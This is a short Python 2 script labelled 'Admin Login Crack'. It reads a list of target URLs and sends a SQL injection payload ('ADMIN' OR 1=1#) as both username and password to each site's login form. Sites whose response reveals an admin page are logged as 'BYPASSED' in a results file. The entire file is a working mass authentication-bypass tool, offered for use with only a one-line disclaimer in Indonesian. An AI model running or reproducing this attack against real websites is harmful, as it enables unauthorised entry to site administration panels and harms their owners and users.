## bypass.py - Admin Login

# -*- coding: utf-8 -*-

##

import sys

import requests

 

__date__ = "24-July-2018"

__author__ = "Riskis_7"

__team__ = "Programmer Indonesia"

__codename__ = "untuk kebaikan jangan di salahgunakan atau gua ngak bertangung jawab,dosa ditangungg sendiri."

__banner__ = """

################################################

# Admin Login Crack #

# Programmer Indonesia #

# 24-July-2018 #

################################################

"""

 

def bypass(target):

	bhs = open("bypass_results.txt", 'a')

	tl = open(target, 'r')

	while True:

		param = {'action':'dologin','uname':'ADMIN%27+OR+1%3D1%23','pass':'ADMIN%27+OR+1%3D1%23','submit':'Admin+Login'}

		list = tl.readline().replace('\n', '')

		if not list:

			break

		url = list

		r = requests.post(url, data=param)

		if "/admin/main.php" in r.text:

			print "\033[1;32m[*]\033[1;37m STATUS : \033[1;32m BYPASSED\033[0m"

			print "\033[1;32m[*]\033[1;37m ADMIN PAGE : \033[1;32m %s/admin/index.php\033[0m" %url

			print "\033[1;32m[*]\033[1;37m USERNAME : \033[1;32m '=\"OR'\033[0m"

			print "\033[1;32m[*]\033[1;37m PASSWORD : \033[1;32m '=\"OR'\033[0m"

			bhs.write(url+"\n")

		else:

			print "\033[1;31m[-]\033[1;37m STATUS : \033[1;31m FAILED\033[0m"

			print "\033[1;31m[-]\033[1;37m URL : %s\n" %url

			pass

 

if __name__ == "__main__":

	if len(sys.argv) != 2:

		print __banner__

		print "Usage: bypass <list_target.txt>"

	else:

		print __banner__

		bypass(sys.argv[1])

